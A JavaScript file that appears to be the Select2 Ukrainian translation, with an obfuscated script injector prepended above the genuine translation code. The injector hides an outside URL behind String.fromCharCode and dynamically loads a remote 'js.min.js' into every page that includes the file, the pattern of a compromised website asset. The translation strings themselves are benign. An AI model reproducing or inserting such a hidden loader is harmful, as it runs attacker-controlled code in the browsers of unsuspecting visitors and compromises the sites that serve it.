var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 <Language> translation.
 * 
 * Author: bigmihail <bigmihail@bigmir.net>
 */
(function ($) {
    "use strict";

    $.extend($.fn.select2.defaults, {
        formatNoMatches: function () { return "Нічого не знайдено"; },
        formatInputTooShort: function (input, min) { var n = min - input.length, s = ["", "и", "ів"], p = [2,0,1,1,1,2]; return "Введіть буль ласка ще " + n + " символ" + s[ (n%100>4 && n%100<=20)? 2 : p[Math.min(n%10, 5)] ]; },
        formatInputTooLong: function (input, max) { var n = input.length - max, s = ["", "и", "ів"], p = [2,0,1,1,1,2]; return "Введіть буль ласка на " + n + " символ" + s[ (n%100>4 && n%100<=20)? 2 : p[Math.min(n%10, 5)] ] + " менше"; },
        formatSelectionTooBig: function (limit) {var s = ["", "и", "ів"], p = [2,0,1,1,1,2];  return "Ви можете вибрати лише " + limit + " елемент" + s[ (limit%100>4 && limit%100<=20)? 2 : p[Math.min(limit%10, 5)] ]; },
        formatLoadMore: function (pageNumber) { return "Завантаження даних..."; },
        formatSearching: function () { return "Пошук..."; }
    });
})(jQuery);
